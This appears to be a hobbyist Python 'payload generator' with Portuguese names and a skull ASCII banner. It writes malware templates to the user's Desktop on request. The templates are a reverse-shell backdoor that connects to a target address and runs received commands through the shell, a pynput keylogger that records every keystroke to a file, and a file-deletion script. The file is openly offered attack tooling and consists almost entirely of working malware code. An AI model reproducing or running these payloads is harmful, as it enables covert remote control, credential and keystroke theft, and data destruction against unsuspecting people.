

import os


def imprimir_caveira():
    caveira = '''
    ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄    ▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   
█       █       █  █  █ █       █   ▄  █ █       █       █       █   ▄  █  
█   ▄▄▄▄█    ▄▄▄█   █▄█ █    ▄▄▄█  █ █ █ █   ▄   █▄     ▄█   ▄   █  █ █ █  
█  █  ▄▄█   █▄▄▄█       █   █▄▄▄█   █▄▄█▄█  █▄█  █ █   █ █  █ █  █   █▄▄█▄ 
█  █ █  █    ▄▄▄█  ▄    █    ▄▄▄█    ▄▄  █       █ █   █ █  █▄█  █    ▄▄  █
█  █▄▄█ █   █▄▄▄█ █ █   █   █▄▄▄█   █  █ █   ▄   █ █   █ █       █   █  █ █
█▄▄▄▄▄▄▄█▄▄▄▄▄▄▄█▄█  █▄▄█▄▄▄▄▄▄▄█▄▄▄█  █▄█▄▄█ █▄▄█ █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄█  █▄█

   :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
by:zxxlising and ezequiel


    '''
    print(caveira)
imprimir_caveira()
os.system("pause")








def gerar_payload(tipo_payload):
    conteudo = gerar_conteudo(tipo_payload)
    nome_arquivo = f"{tipo_payload}.py"
    caminho_pasta = os.path.join(os.path.expanduser('~'), 'Desktop', 'Payloads')
    
    if not os.path.exists(caminho_pasta):
        os.makedirs(caminho_pasta)
    
    caminho_arquivo = os.path.join(caminho_pasta, nome_arquivo)
    
    with open(caminho_arquivo, 'w') as arquivo:
        arquivo.write(conteudo)
    
    return f"Payload do tipo {tipo_payload} criado em {caminho_arquivo}\n\nCódigo do Payload:\n{conteudo}"

def gerar_conteudo(tipo_payload):
    if tipo_payload == "backdoor":
        return """# #
import socket
import subprocess

ip_alvo = "ip_do_alvo"
porta_alvo = porta_do_alvo         

def conectar():
    try:
        cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cliente.connect((ip_alvo, porta_alvo))
        while True:
            comando = cliente.recv(1024).decode()
            if comando.lower() == "exit":
                break
            resultado = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            saida_comando = resultado.stdout.read() + resultado.stderr.read()
            cliente.send(saida_comando)
        cliente.close()
    except Exception as e:
        return f"Erro ao conectar ao servidor: {e}"
conectar()

"""
    elif tipo_payload == "keylogger":
        return """
import pynput.keyboard

def registrar_teclas_pressionadas(key):
    try:
        tecla = key.char
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            tecla = " "
        else:
            tecla = f" {str(key)} "
    
    with open("registros.txt", "a") as arquivo:
        arquivo.write(tecla)

teclado = pynput.keyboard.Listener(on_press=registrar_teclas_pressionadas)
with teclado as escutador:
    escutador.join()
"""
    elif tipo_payload == "delete files":
        return """
import os

alvo = "caminho_do_arquivo_a_ser_excluido.txt"

try:
    os.remove(alvo)
    print(f"Arquivo {alvo} excluído com sucesso.")
except FileNotFoundError:
    print(f"Arquivo {alvo} não encontrado.")
except Exception as e:
    print(f"Erro ao excluir o arquivo {alvo}: {e}")
"""
    else:
        return "Tipo de payload inválido."
tipo_payload_escolhido = input("Digite o tipo de payload que você deseja criar (backdoor, keylogger ou delete files): ")
input("Obrigado por utilizar nosso software!")
resultado_geracao = gerar_payload(tipo_payload_escolhido)

print(resultado_geracao)